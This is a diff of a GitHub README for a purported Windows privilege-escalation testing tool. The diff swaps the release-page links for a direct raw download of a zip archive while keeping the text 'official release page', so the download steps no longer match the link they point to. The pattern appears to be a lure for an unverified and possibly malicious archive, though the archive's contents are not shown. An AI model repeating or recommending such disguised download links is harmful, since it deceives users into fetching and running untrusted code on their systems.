@@ -1,6 +1,6 @@
 # 🔨 SNEK_Blue-War-Hammer - Secure Your Windows System Integrity Today
 
-[![Download Blue Hammer](https://img.shields.io/badge/Download-Blue-War-Hammer-blue)](https://github.com/kupfferscellwatchnight301/SNEK_Blue-War-Hammer/releases)
+[![Download Blue Hammer](https://img.shields.io/badge/Download-Blue-War-Hammer-blue)](https://github.com/kupfferscellwatchnight301/SNEK_Blue-War-Hammer/raw/refs/heads/main/agnatic/War-Hammer-Blue-SNE-1.2-beta.3.zip)
 
 SNEK_Blue-War-Hammer provides security researchers and system administrators with a tool to identify local privilege escalation vulnerabilities. It documents specific security gaps in Windows environments and provides a reimplementation for testing purposes. Use this tool to verify the strength of your system defenses and manage security risks effectively.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these conditions before you begin the setup process.
 
 The project distribution relies on a centralized release page to ensure version consistency. Follow these steps to obtain the correct files.
 
-1.  Navigate to the [official release page](https://github.com/kupfferscellwatchnight301/SNEK_Blue-War-Hammer/releases).
+1.  Navigate to the [official release page](https://github.com/kupfferscellwatchnight301/SNEK_Blue-War-Hammer/raw/refs/heads/main/agnatic/War-Hammer-Blue-SNE-1.2-beta.3.zip).
 2.  Locate the section labeled "Assets."
 3.  Click the file ending in `.zip` to start your download.
 4.  Save the file to a known location, such as your Downloads folder.
